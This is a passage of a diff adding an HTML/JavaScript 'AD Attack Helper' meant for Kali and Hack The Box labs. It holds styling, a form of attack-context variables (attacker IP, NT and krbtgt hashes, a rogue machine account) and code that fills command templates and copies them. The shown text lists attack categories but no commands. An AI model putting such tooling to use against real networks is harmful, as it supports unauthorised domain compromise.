@@ -1,0 +1,1746 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hackerman v1.0 — AD Attack Helper (Kali · HTB)</title>
+<style>
+:root{
+  --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
+  --txt:#dbe4f3; --dim:#7c8db0; --accent:#22d3ee; --accent2:#38bdf8;
+  --ok:#34d399; --warn:#fbbf24; --bad:#f87171;
+  --v-domain:#22d3ee; --v-host:#facc15; --v-ip:#fb923c; --v-user:#4ade80;
+  --v-secret:#f87171; --v-hash:#e879f9; --v-key:#c084fc; --v-spn:#60a5fa;
+  --v-file:#a78bfa; --v-num:#fda4af; --v-flag:#94a3b8; --v-sid:#a5b4fc;
+  --mono:ui-monospace,SFMono-Regular,"JetBrains Mono","Fira Code",Menlo,Consolas,monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{background:var(--bg);color:var(--txt);font-family:var(--sans);font-size:14px;line-height:1.45}
+a{color:var(--accent2)}
+.dim{color:var(--dim)}
+.mono{font-family:var(--mono)}
+
+header{position:sticky;top:0;z-index:50;background:linear-gradient(180deg,#0c1424 0%,#0c1424f2 100%);border-bottom:1px solid var(--line);backdrop-filter:blur(6px)}
+.hwrap{display:flex;align-items:center;gap:14px;flex-wrap:wrap;padding:9px 16px}
+.brand{font-weight:700;letter-spacing:.3px;white-space:nowrap}
+.brand b{color:var(--accent)}
+.hactions{margin-left:auto;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+button,select,input,textarea{font-family:inherit;font-size:13px;color:var(--txt);background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:5px 9px}
+button{cursor:pointer}
+button:hover{border-color:var(--accent);color:#fff}
+button.primary{background:#0e7490;border-color:#155e75;color:#fff}
+button.ghost{background:transparent}
+label.proxy{display:flex;align-items:center;gap:6px;background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:5px 9px;cursor:pointer;user-select:none}
+label.proxy input{accent-color:var(--accent)}
+label.proxy.on{border-color:var(--accent);color:#fff}
+
+#ctx{border-bottom:1px solid var(--line);background:var(--panel)}
+.ctx-head{display:flex;align-items:center;gap:10px;padding:6px 16px;cursor:pointer;user-select:none}
+.ctx-head .title{font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
+.ctx-head .chev{margin-left:auto;transition:transform .15s}
+#ctx.closed .chev{transform:rotate(-90deg)}
+.ctx-body{padding:4px 16px 14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px 18px}
+#ctx.closed .ctx-body{display:none}
+.ctx-group{display:flex;flex-direction:column;gap:6px;min-width:0}
+.ctx-group>.gname{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--dim);border-bottom:1px dashed var(--line);padding-bottom:3px}
+.field{display:flex;align-items:center;gap:8px}
+.field label{flex:0 0 96px;text-align:right;font-size:12px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.field input{flex:1;min-width:0;font-family:var(--mono);font-size:12.5px}
+.field input.derived{color:var(--dim);font-style:italic}
+.field input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}
+.ctx-summary{font-size:12px;color:var(--dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:50vw}
+
+nav.tabs{position:sticky;top:var(--headerH,45px);z-index:40;display:flex;gap:2px;padding:0 16px;background:#0c1424;border-bottom:1px solid var(--line)}
+nav.tabs button{background:transparent;border:none;border-bottom:2px solid transparent;border-radius:0;padding:10px 14px;color:var(--dim);font-weight:600}
+nav.tabs button.active{color:#fff;border-bottom-color:var(--accent)}
+nav.tabs button:hover{color:#fff}
+main{padding:16px;max-width:1500px;margin:0 auto}
+.tab{display:none}
+.tab.active{display:block}
+
+.toolbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:14px;position:sticky;top:calc(var(--headerH,45px) + var(--tabsH,43px));z-index:30;background:var(--bg);padding:8px 0}
+#search{flex:0 0 330px;font-family:var(--mono)}
+.chips{display:flex;gap:5px;flex-wrap:wrap}
+.chip{font-size:12px;padding:3px 9px;border-radius:999px;border:1px solid var(--line);background:var(--panel2);cursor:pointer;color:var(--dim)}
+.chip:hover{color:#fff;border-color:var(--accent)}
+.chip.on{background:#0e7490;border-color:#155e75;color:#fff}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(420px,1fr));gap:14px}
+.recipe{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px 13px;display:flex;flex-direction:column;gap:8px;min-width:0}
+.recipe.incomplete{border-color:#7f1d1d}
+.rc-head{display:flex;align-items:flex-start;gap:8px}
+.rc-head h3{margin:0;font-size:14.5px;flex:1}
+.cat{font-size:10.5px;text-transform:uppercase;letter-spacing:.08em;padding:2px 7px;border-radius:5px;background:#0e2a3a;color:var(--accent);border:1px solid #164e63;white-space:nowrap}
+.desc{color:var(--dim);font-size:12.5px;margin:0}
+.badge{font-size:11px;color:var(--warn)}
+.badge.miss{color:var(--bad)}
+.cmd{position:relative;background:#070c16;border:1px solid var(--line);border-radius:8px;padding:8px 40px 8px 10px;overflow-x:auto}
+.cmd .clabel{font-size:11px;color:var(--dim);margin-bottom:4px}
+.cmd pre{margin:0;font-family:var(--mono);font-size:12.8px;white-space:pre-wrap;word-break:break-word}
+.copy{position:absolute;top:6px;right:6px;padding:2px 8px;font-size:11px;background:#132038;border-color:#24334f;color:var(--dim)}
+.copy:hover{color:#fff}
+.copy.done{color:var(--ok);border-color:var(--ok)}
+.note{font-size:12.3px;color:#a8b8d8;background:#0d1a2e;border-left:3px solid var(--accent2);border-radius:0 7px 7px 0;padding:7px 10px}
+.note b{color:var(--accent2)}
+.v-domain{color:var(--v-domain)} .v-host{color:var(--v-host)} .v-ip{color:var(--v-ip)}
+.v-user{color:var(--v-user)} .v-secret{color:var(--v-secret)} .v-hash{color:var(--v-hash)}
+.v-key{color:var(--v-key)} .v-spn{color:var(--v-spn)} .v-file{color:var(--v-file)}
+.v-num{color:var(--v-num)} .v-flag{color:var(--v-flag)} .v-sid{color:var(--v-sid)}
+.v-proxy{color:#f472b6;font-weight:600}
+.v-miss{color:#fca5a5;background:#3b0d0d;border-radius:3px;padding:0 3px;border-bottom:1px dashed #fca5a5}
+
+.flows{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:14px}
+.flow{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px;cursor:pointer;display:flex;flex-direction:column;gap:7px;transition:border-color .15s,transform .1s}
+.flow:hover{border-color:var(--accent);transform:translateY(-1px)}
+.flow h3{margin:0;font-size:15px}
+.flow p{margin:0;color:var(--dim);font-size:12.5px}
+.flow .meta{font-size:11.5px;color:var(--dim);display:flex;align-items:center;gap:8px}
+.pbar{height:5px;background:#0a1424;border-radius:999px;overflow:hidden;border:1px solid var(--line)}
+.pbar>i{display:block;height:100%;background:linear-gradient(90deg,#0891b2,#22d3ee);width:0}
+.back{background:transparent;border:none;color:var(--accent2);padding:0;margin-bottom:10px;font-size:13px}
+.flowhead{margin-bottom:14px}
+.flowhead h2{margin:0 0 4px;font-size:19px}
+.flowhead p{margin:0 0 10px;color:var(--dim)}
+.step{border-left:2px solid var(--line);padding:0 0 16px 16px;position:relative;margin-left:6px}
+.step::before{content:"";position:absolute;left:-7px;top:4px;width:12px;height:12px;border-radius:50%;background:var(--panel2);border:2px solid var(--line)}
+.step.done::before{background:var(--ok);border-color:var(--ok)}
+.step-head{display:flex;align-items:center;gap:10px;margin-bottom:9px}
+.step-head h3{margin:0;font-size:15px;flex:1}
+.step-head input{accent-color:var(--ok);width:16px;height:16px;cursor:pointer}
+.step .stip{color:var(--dim);font-size:12.5px;margin:0 0 10px}
+.step .grid{grid-template-columns:1fr}
+
+.tbl{width:100%;border-collapse:collapse}
+.tbl td,.tbl th{border-bottom:1px solid var(--line);padding:7px 9px;text-align:left;vertical-align:top;font-size:13px}
+.tbl th{color:var(--dim);font-weight:600;font-size:11.5px;text-transform:uppercase;letter-spacing:.08em}
+.swatch{display:inline-block;width:10px;height:10px;border-radius:3px;margin-right:7px;vertical-align:middle}
+h2.sec{font-size:17px;margin:26px 0 12px;border-bottom:1px solid var(--line);padding-bottom:7px}
+h2.sec:first-child{margin-top:4px}
+
+.cyber{background:var(--panel);border:1px solid var(--line);border-radius:9px;padding:10px 12px;margin-bottom:10px}
+.cyber h4{margin:0 0 4px;font-size:13.5px}
+.cyber .cmd{margin-top:7px}
+
+.modal{position:fixed;inset:0;background:#000a;display:flex;align-items:center;justify-content:center;z-index:100}
+.modal.hidden{display:none}
+.modal-box{background:var(--panel);border:1px solid var(--line);border-radius:12px;width:min(720px,92vw);padding:16px;display:flex;flex-direction:column;gap:10px}
+.modal-box h3{margin:0}
+.modal-box textarea{height:300px;font-family:var(--mono);font-size:12px;resize:vertical}
+.modal-actions{display:flex;gap:8px;justify-content:flex-end}
+#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:#0e7490;color:#fff;padding:8px 18px;border-radius:999px;font-weight:600;transition:transform .2s;z-index:200;box-shadow:0 6px 20px #0008}
+#toast.show{transform:translateX(-50%) translateY(0)}
+footer{color:var(--dim);text-align:center;padding:26px 16px;font-size:12px}
+kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2px;border-radius:4px;padding:0 5px;font-family:var(--mono);font-size:11.5px}
+@media (max-width:760px){
+  .ctx-body{grid-template-columns:1fr}
+  .field label{flex-basis:80px}
+  #search{flex:1 1 100%}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="hwrap">
+    <div class="brand">Hackerman <b>v1.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="hactions">
+      <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
+      <button id="presetSave" title="Save current context as preset">Save</button>
+      <button id="presetDel" class="ghost" title="Delete selected preset">Del</button>
+      <button id="expBtn" class="ghost" title="Export context as JSON">Export</button>
+      <button id="impBtn" class="ghost" title="Import context JSON">Import</button>
+      <button id="resetBtn" class="ghost" title="Reset context">Reset</button>
+      <label class="proxy" id="proxyLbl"><input type="checkbox" id="proxyChk"> proxychains</label>
+    </div>
+  </div>
+</header>
+
+<section id="ctx">
+  <div class="ctx-head" id="ctxToggle">
+    <span class="title">Context</span>
+    <span class="ctx-summary mono" id="ctxSummary"></span>
+    <span class="chev">▾</span>
+  </div>
+  <div class="ctx-body" id="ctxBody"></div>
+</section>
+
+<nav class="tabs" id="tabs">
+  <button data-tab="wizard" class="active">Wizard</button>
+  <button data-tab="recipes">Recipes</button>
+  <button data-tab="bh">BloodHound</button>
+  <button data-tab="legend">Legend</button>
+</nav>
+
+<main>
+  <section id="tab-wizard" class="tab active"></section>
+  <section id="tab-recipes" class="tab">
+    <div class="toolbar">
+      <input id="search" placeholder="search recipes / commands…   [/]">
+      <div class="chips" id="catFilter"></div>
+    </div>
+    <div class="grid" id="recipeList"></div>
+  </section>
+  <section id="tab-bh" class="tab"></section>
+  <section id="tab-legend" class="tab"></section>
+</main>
+
+<footer class="mono">Hackerman v1.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+
+<div id="modal" class="modal hidden">
+  <div class="modal-box">
+    <h3 id="modalTitle"></h3>
+    <textarea id="modalText" spellcheck="false"></textarea>
+    <div class="modal-actions">
+      <button id="modalCopy" class="ghost">Copy</button>
+      <button id="modalApply" class="primary">Apply</button>
+      <button id="modalClose">Close</button>
+    </div>
+  </div>
+</div>
+<div id="toast"></div>
+
+<script>
+'use strict';
+
+/* ============================== state ============================== */
+const LS_STATE = 'adah.state.v1', LS_PROG = 'adah.progress.v1', LS_PRESETS = 'adah.presets.v1';
+
+const VAR_DEFS = [
+  {k:'domain',      label:'Domain FQDN',   ph:'argon.htb',                 grp:'Domain / DC', color:'v-domain', req:1},
+  {k:'netbios',     label:'NetBIOS',       ph:'ARGON',                     grp:'Domain / DC', color:'v-domain'},
+  {k:'realm',       label:'Realm',         ph:'ARGON.HTB',                 grp:'Domain / DC', color:'v-domain', derive:s=>(s.domain||'').toUpperCase()},
+  {k:'domain_dn',   label:'Domain DN',     ph:'DC=ARGON,DC=HTB',           grp:'Domain / DC', color:'v-host', derive:s=>s.domain?('DC='+s.domain.split('.').join(',DC=')):''},
+  {k:'dc_host',     label:'DC host',       ph:'prod-dc',                   grp:'Domain / DC', color:'v-host', req:1},
+  {k:'dc_fqdn',     label:'DC FQDN',       ph:'prod-dc.argon.htb',         grp:'Domain / DC', color:'v-host', derive:s=>s.dc_host?(s.dc_host.includes('.')?s.dc_host:(s.domain?s.dc_host+'.'+s.domain:s.dc_host)):''},
+  {k:'dc_ip',       label:'DC IP',         ph:'172.16.6.100',              grp:'Domain / DC', color:'v-ip', req:1},
+  {k:'dc_dn',       label:'DC DN',         ph:'CN=PROD-DC,OU=DOMAIN CONTROLLERS,DC=ARGON,DC=HTB', grp:'Domain / DC', color:'v-host'},
+  {k:'parent_domain',label:'Parent domain',ph:'htb.local',                 grp:'Domain / DC', color:'v-domain'},
+  {k:'target_host', label:'Target host',   ph:'prod-sql',                  grp:'Target', color:'v-host', req:1},
+  {k:'target_fqdn', label:'Target FQDN',   ph:'prod-sql.argon.htb',        grp:'Target', color:'v-host', derive:s=>s.target_host?(s.target_host.includes('.')?s.target_host:(s.domain?s.target_host+'.'+s.domain:s.target_host)):''},
+  {k:'target_ip',   label:'Target IP',     ph:'172.16.6.50',               grp:'Target', color:'v-ip'},
+  {k:'target_user', label:'Impersonate',   ph:'Administrator',             grp:'Target', color:'v-user'},
+  {k:'spn',         label:'SPN',           ph:'MSSQLSvc/PROD-SQL',         grp:'Target', color:'v-spn'},
+  {k:'dn',          label:'Target DN',     ph:'CN=PROD-SQL,CN=COMPUTERS,DC=ARGON,DC=HTB', grp:'Target', color:'v-host'},
+  {k:'user',        label:'User',          ph:'eric.dutton',               grp:'Access', color:'v-user', req:1},
+  {k:'password',    label:'Password',      ph:'…',                         grp:'Access', color:'v-secret'},
+  {k:'nthash',      label:'NT hash',       ph:'c5f7e15cca6397af0ac9b0bb0e926f95', grp:'Access', color:'v-hash'},
+  {k:'aeskey',      label:'AES key',       ph:'2c7633c5d3497ada…',         grp:'Access', color:'v-key'},
+  {k:'ccache',      label:'ccache path',   ph:'/home/kali/Administrator.ccache', grp:'Access', color:'v-file'},
+  {k:'krbtgt_hash', label:'krbtgt / key',  ph:'ntlm or aes of krbtgt',     grp:'Access', color:'v-hash'},
+  {k:'domain_sid',  label:'Domain SID',    ph:'S-1-5-21-…',                grp:'Access', color:'v-sid'},
+  {k:'extra_sid',   label:'Extra SID',     ph:'S-1-5-21-…-519',            grp:'Access', color:'v-sid'},
+  {k:'attacker_ip', label:'Attacker IP',   ph:'10.10.14.5',                 grp:'Attacker', color:'v-ip', req:1},
+  {k:'iface',       label:'Interface',     ph:'tun0',                       grp:'Attacker', color:'v-flag'},
+  {k:'lport',       label:'Listener port', ph:'9001',                       grp:'Attacker', color:'v-num'},
+  {k:'proxy_chain', label:'Proxy chain',   ph:'socks5 127.0.0.1 1080',      grp:'Attacker', color:'v-flag'},
+  {k:'computer_name',label:'Rogue machine',ph:'EVIL$',                     grp:'Attack params', color:'v-user'},
+  {k:'computer_pass',label:'Machine pass', ph:'Password123!',              grp:'Attack params', color:'v-secret'},
+  {k:'ca',          label:'CA name',       ph:'argon-CA',                  grp:'Attack params', color:'v-spn'},
+  {k:'ca_host',     label:'CA host',       ph:'prod-dc.argon.htb',         grp:'Attack params', color:'v-host'},
+  {k:'template',    label:'Cert template', ph:'WebServer',                 grp:'Attack params', color:'v-spn'},
+  {k:'group',       label:'Group',         ph:'Domain Admins',             grp:'Attack params', color:'v-user'},
+  {k:'wordlist',    label:'Wordlist',      ph:'/usr/share/wordlists/rockyou.txt', grp:'Attack params', color:'v-file'},
+  {k:'keytab',      label:'Keytab file',   ph:'/etc/krb5.keytab',          grp:'Attack params', color:'v-file'},
+  {k:'hashfile',    label:'Hash out file', ph:'hashes.txt',                grp:'Attack params', color:'v-file'},
+  {k:'ou',          label:'OU (DN)',       ph:'CN=Computers,DC=ARGON,DC=HTB', grp:'Attack params', color:'v-host'}
+];
+
+const DEFAULT_STATE = {
+  iface:'tun0', proxy:false, proxy_chain:'socks5 127.0.0.1 1080',
+  target_user:'Administrator', computer_name:'EVIL$', computer_pass:'Password123!',
+  wordlist:'/usr/share/wordlists/rockyou.txt', keytab:'/etc/krb5.keytab', hashfile:'hashes.txt', lport:'9001'
+};
+
+const CATS = [
+  {id:'recon',   name:'Recon & Auth'},
+  {id:'bloodyad',name:'BloodyAD'},
+  {id:'krb',     name:'Kerberos'},
+  {id:'deleg',   name:'Delegation & RBCD'},
+  {id:'adcs',    name:'ADCS / Certipy'},
+  {id:'dacl',    name:'ACL / DACL Abuse'},
+  {id:'creds',   name:'Creds & Secrets'},
+  {id:'relay',   name:'Poisoning & Relay'},
+  {id:'lateral', name:'Lateral Movement'},
+  {id:'post',    name:'Post-Exploitation'},
+  {id:'mssql',   name:'MSSQL'},
+  {id:'trust',   name:'Trusts'},
+  {id:'bh',      name:'BloodHound Collection'}
+];
+
+function loadJSON(key, fb){ try { const v = JSON.parse(localStorage.getItem(key)); return v == null ? fb : v; } catch(e){ return fb; } }
+let S = Object.assign({}, DEFAULT_STATE, loadJSON(LS_STATE, {}));
+let PROG = loadJSON(LS_PROG, {});
+let PRESETS = loadJSON(LS_PRESETS, {});
+
+const RECIPES = [];
+const FLOWS = [];
+const CYPHER = [];
+const R = r => RECIPES.push(r);
+
+function saveState(){ try { localStorage.setItem(LS_STATE, JSON.stringify(S)); } catch(e){} }
+function saveProg(){ try { localStorage.setItem(LS_PROG, JSON.stringify(PROG)); } catch(e){} }
+function savePresets(){ try { localStorage.setItem(LS_PRESETS, JSON.stringify(PRESETS)); } catch(e){} }
+
+/* ============================== rendering core ============================== */
+const $ = s => document.querySelector(s);
+const $$ = s => Array.from(document.querySelectorAll(s));
+const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+
+function val(k){
+  const d = VAR_DEFS.find(v => v.k === k);
+  if(!d) return '';
+  let v = (S[k] == null ? '' : String(S[k])).trim();
+  if(!v && d.derive) v = d.derive(S) || '';
+  return v;
+}
+
+function proxyOn(){ return !!S.proxy; }
+
+function renderCommand(c){
+  let tpl, label = '', flags = '';
+  if(Array.isArray(c)){ tpl = c[0]; label = c[1] || ''; flags = c[2] || ''; }
+  else { tpl = c; }
+  const parts = [], miss = [];
+  const re = /\{\{(\w+)\}\}/g;
+  let last = 0, m;
+  while((m = re.exec(tpl))){
+    if(m.index > last) parts.push({t:tpl.slice(last, m.index)});
+    const d = VAR_DEFS.find(v => v.k === m[1]);
+    const v = val(m[1]);
+    if(v) parts.push({t:v, c:d ? d.color : '', k:m[1]});
+    else { const lbl = d ? d.label : m[1]; miss.push(lbl); parts.push({t:'‹' + lbl + '?›', c:'v-miss', k:m[1]}); }
+    last = re.lastIndex;
+  }
+  if(last < tpl.length) parts.push({t:tpl.slice(last)});
+  const pre = [];
+  if(flags.indexOf('s') >= 0) pre.push({t:'sudo ', c:'v-flag'});
+  if(proxyOn() && flags.indexOf('n') < 0) pre.push({t:'proxychains ', c:'v-proxy'});
+  const html = pre.concat(parts).map(p => p.c ? '<span class="' + p.c + '">' + esc(p.t) + '</span>' : esc(p.t)).join('');
+  const text = pre.map(p => p.t).join('') + parts.map(p => p.t).join('');
+  return {html, text, label, miss};
+}
+
+function copyText(t){
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(t).then(() => toast('copied'), () => fallbackCopy(t));
+  } else fallbackCopy(t);
+}
+function fallbackCopy(t){
+  const ta = document.createElement('textarea');
+  ta.value = t; ta.style.position = 'fixed'; ta.style.opacity = '0';
+  document.body.appendChild(ta); ta.select();
+  try { document.execCommand('copy'); toast('copied'); } catch(e){ toast('copy failed'); }
+  document.body.removeChild(ta);
+}
+let toastT;
+function toast(msg){
+  const el = $('#toast'); el.textContent = msg; el.classList.add('show');
+  clearTimeout(toastT); toastT = setTimeout(() => el.classList.remove('show'), 1400);
+}
+
+function mkCopyBtn(text, cls){
+  const b = document.createElement('button');
+  b.className = 'copy' + (cls ? ' ' + cls : '');
+  b.textContent = 'copy';
+  b.addEventListener('click', () => {
+    copyText(text);
+    b.classList.add('done'); b.textContent = '✓';
+    setTimeout(() => { b.classList.remove('done'); b.textContent = 'copy'; }, 1200);
+  });
+  return b;
+}
+
+function renderNote(html){
+  return String(html).replace(/\{\{(\w+)\}\}/g, (m, k) => {
+    const d = VAR_DEFS.find(v => v.k === k);
+    const v = val(k);
+    if(v) return '<span class="' + (d ? d.color : '') + '">' + esc(v) + '</span>';
+    return '<span class="v-miss">‹' + (d ? d.label : k) + '?›</span>';
+  });
+}
+
+function recipeCard(r, compact){
+  const card = document.createElement('div');
+  card.className = 'recipe';
+  const rendered = r.cmds.map(renderCommand);
+  const misses = [];
+  rendered.forEach(x => x.miss.forEach(l => { if(misses.indexOf(l) < 0) misses.push(l); }));
+  if(misses.length) card.classList.add('incomplete');
+
+  const head = document.createElement('div');
+  head.className = 'rc-head';
+  const cat = document.createElement('span');
+  cat.className = 'cat';
+  const c = CATS.find(x => x.id === r.cat);
+  cat.textContent = c ? c.name : r.cat;
+  const h3 = document.createElement('h3');
+  h3.textContent = r.title;
+  head.appendChild(cat); head.appendChild(h3);
+  if(misses.length){
+    const b = document.createElement('span');
+    b.className = 'badge miss'; b.title = 'missing context variables';
+    b.textContent = 'missing: ' + misses.join(', ');
+    head.appendChild(b);
+  }
+  const all = rendered.map(x => x.text).join('\n');
+  head.appendChild(mkCopyBtn(all));
+  card.appendChild(head);
+
+  if(r.desc){
+    const p = document.createElement('p');
+    p.className = 'desc';
+    p.textContent = r.desc;
+    card.appendChild(p);
+  }
+  rendered.forEach((x, i) => {
+    const wrap = document.createElement('div');
+    wrap.className = 'cmd';
+    if(x.label){
+      const l = document.createElement('div');
+      l.className = 'clabel';
+      l.textContent = x.label;
+      wrap.appendChild(l);
+    }
+    const pre = document.createElement('pre');
+    pre.innerHTML = x.html;
+    wrap.appendChild(pre);
+    wrap.appendChild(mkCopyBtn(x.text));
+    card.appendChild(wrap);
+  });
+  if(r.note){
+    const n = document.createElement('div');
+    n.className = 'note';
+    n.innerHTML = renderNote(r.note);
+    card.appendChild(n);
+  }
+  return card;
+}
+
+/* ============================== context bar ============================== */
+const GROUPS = ['Domain / DC','Target','Access','Attacker','Attack params'];
+const ctxInputs = {};
+
+function buildContext(){
+  const body = $('#ctxBody');
+  body.innerHTML = '';
+  GROUPS.forEach(g => {
+    const box = document.createElement('div');
+    box.className = 'ctx-group';
+    const gn = document.createElement('div');
+    gn.className = 'gname'; gn.textContent = g;
+    box.appendChild(gn);
+    VAR_DEFS.filter(v => v.grp === g).forEach(v => {
+      const f = document.createElement('div');
+      f.className = 'field';
+      const l = document.createElement('label');
+      l.textContent = v.label;
+      const i = document.createElement('input');
+      i.type = 'text'; i.placeholder = v.ph || ''; i.autocomplete = 'off'; i.spellcheck = false;
+      if(v.derive) i.readOnly = true, i.classList.add('derived');
+      const handler = () => {
+        if(v.derive) return;
+        S[v.k] = i.value; saveState(); updateSummary(); scheduleRender();
+      };
+      i.addEventListener('input', handler);
+      i.addEventListener('change', handler);
+      f.appendChild(l); f.appendChild(i);
+      box.appendChild(f);
+      ctxInputs[v.k] = i;
+    });
+    body.appendChild(box);
+  });
+  syncContext();
+}
+
+function syncContext(){
+  VAR_DEFS.forEach(v => { const i = ctxInputs[v.k]; if(i) i.value = val(v.k); });
+  const pc = $('#proxyChk');
+  pc.checked = proxyOn();
+  $('#proxyLbl').classList.toggle('on', proxyOn());
+  updateSummary();
+}
+
+function updateSummary(){
+  const bits = [];
+  if(val('domain')) bits.push(val('domain'));
+  if(val('user')) bits.push(val('user') + (val('password') ? ':•••' : (val('nthash') ? ' #hash' : (val('ccache') ? ' #ccache' : ''))));
+  if(val('target_host')) bits.push('→ ' + val('target_host'));
+  $('#ctxSummary').textContent = bits.join('  ');
+}
+
+/* ============================== recipes tab ============================== */
+let activeCat = 'all', searchQ = '';
+
+function buildCatFilter(){
+  const box = $('#catFilter');
+  box.innerHTML = '';
+  [['all','All']].concat(CATS.map(c => [c.id, c.name])).forEach(([id, name]) => {
+    const b = document.createElement('button');
+    b.className = 'chip' + (id === activeCat ? ' on' : '');
+    b.textContent = name;
+    b.addEventListener('click', () => { activeCat = id; buildCatFilter(); renderRecipes(); });
+    box.appendChild(b);
+  });
+}
+
+function recipeMatches(r){
+  if(activeCat !== 'all' && r.cat !== activeCat) return false;
+  if(!searchQ) return true;
+  const hay = (r.title + ' ' + (r.desc || '') + ' ' + r.cmds.map(c => Array.isArray(c) ? c[0] + ' ' + (c[1] || '') : c).join(' ')).toLowerCase();
+  return hay.indexOf(searchQ) >= 0;
+}
+
+function renderRecipes(){
+  const list = $('#recipeList');
+  list.innerHTML = '';
+  const found = RECIPES.filter(recipeMatches);
+  if(!found.length){
+    const p = document.createElement('p');
+    p.className = 'dim';
+    p.textContent = 'no recipes match.';
+    list.appendChild(p);
+    return;
+  }
+  found.forEach(r => list.appendChild(recipeCard(r)));
+}
+
+/* ============================== wizard tab ============================== */
+let activeFlow = null;
+
+function flowProgress(f){
+  const st = PROG[f.id] || {};
+  let done = 0;
+  f.steps.forEach((s, i) => { if(st[i]) done++; });
+  return {done, total:f.steps.length};
+}
+
+function renderWizard(){
+  const tab = $('#tab-wizard');
+  tab.innerHTML = '';
+  if(!activeFlow){
+    const p = document.createElement('p');
+    p.className = 'dim';
+    p.style.marginTop = '0';
+    p.innerHTML = 'Pick what you have — each flow lists ordered steps with ready-to-copy commands using your context above.';
+    tab.appendChild(p);
+    const grid = document.createElement('div');
+    grid.className = 'flows';
+    FLOWS.forEach(f => {
+      const card = document.createElement('div');
+      card.className = 'flow';
+      const h = document.createElement('h3'); h.textContent = f.title;
+      const d = document.createElement('p'); d.textContent = f.when || '';
+      const meta = document.createElement('div');
+      const pr = flowProgress(f);
+      meta.className = 'meta';
+      meta.innerHTML = '<span class="' + (pr.done === pr.total ? 'v-user' : 'dim') + '">' + pr.done + '/' + pr.total + ' steps</span>';
+      const bar = document.createElement('div');
+      bar.className = 'pbar'; bar.style.flex = '1';
+      const fill = document.createElement('i');
+      fill.style.width = (pr.total ? Math.round(pr.done / pr.total * 100) : 0) + '%';
+      bar.appendChild(fill); meta.appendChild(bar);
+      card.appendChild(h); card.appendChild(d); card.appendChild(meta);
+      card.addEventListener('click', () => { activeFlow = f.id; renderWizard(); window.scrollTo({top:0}); });
+      grid.appendChild(card);
+    });
+    tab.appendChild(grid);
+    return;
+  }
+  const f = FLOWS.find(x => x.id === activeFlow);
+  if(!f){ activeFlow = null; return renderWizard(); }
+  const back = document.createElement('button');
+  back.className = 'back'; back.textContent = '← all flows';
+  back.addEventListener('click', () => { activeFlow = null; renderWizard(); });
+  tab.appendChild(back);
+
+  const head = document.createElement('div');
+  head.className = 'flowhead';
+  const pr = flowProgress(f);
+  const h2 = document.createElement('h2'); h2.textContent = f.title;
+  const wp = document.createElement('p'); wp.textContent = f.when || '';
+  const bar = document.createElement('div');
+  bar.className = 'pbar'; bar.style.maxWidth = '280px';
+  const fill = document.createElement('i');
+  fill.style.width = (pr.total ? Math.round(pr.done / pr.total * 100) : 0) + '%';
+  bar.appendChild(fill);
+  head.appendChild(h2); head.appendChild(wp); head.appendChild(bar);
+  const actions = document.createElement('div');
+  actions.style.margin = '10px 0 18px';
+  const copyFlow = document.createElement('button');
+  copyFlow.className = 'ghost';
+  copyFlow.textContent = 'copy flow as markdown';
+  copyFlow.addEventListener('click', () => copyText(flowMarkdown(f)));
+  actions.appendChild(copyFlow);
+  head.appendChild(actions);
+  tab.appendChild(head);
+
+  const st = PROG[f.id] || {};
+  f.steps.forEach((step, i) => {
+    const el = document.createElement('div');
+    el.className = 'step' + (st[i] ? ' done' : '');
+    const sh = document.createElement('div');
+    sh.className = 'step-head';
+    const cb = document.createElement('input');
+    cb.type = 'checkbox'; cb.checked = !!st[i];
+    cb.title = 'mark step done';
+    cb.addEventListener('change', () => {
+      if(!PROG[f.id]) PROG[f.id] = {};
+      PROG[f.id][i] = cb.checked;
+      saveProg(); renderWizard();
+    });
+    const h3 = document.createElement('h3');
+    h3.textContent = (i + 1) + '. ' + step.t;
+    sh.appendChild(cb); sh.appendChild(h3);
+    el.appendChild(sh);
+    if(step.d){
+      const p = document.createElement('p');
+      p.className = 'stip'; p.innerHTML = renderNote(step.d);
+      el.appendChild(p);
+    }
+    const grid = document.createElement('div');
+    grid.className = 'grid';
+    (step.r || []).forEach(id => {
+      const r = RECIPES.find(x => x.id === id);
+      if(r) grid.appendChild(recipeCard(r, true));
+    });
+    el.appendChild(grid);
+    tab.appendChild(el);
+  });
+}
+
+function mdNote(s){
+  return String(s).replace(/<[^>]+>/g, '').replace(/\{\{(\w+)\}\}/g, (m, k) => {
+    const d = VAR_DEFS.find(v => v.k === k);
+    return val(k) || ('‹' + (d ? d.label : k) + '?›');
+  });
+}
+
+function flowMarkdown(f){
+  let out = '## ' + f.title + '\n\n' + (f.when || '') + '\n';
+  f.steps.forEach((step, i) => {
+    out += '\n### ' + (i + 1) + '. ' + step.t + '\n';
+    if(step.d) out += '\n' + mdNote(step.d) + '\n';
+    (step.r || []).forEach(id => {
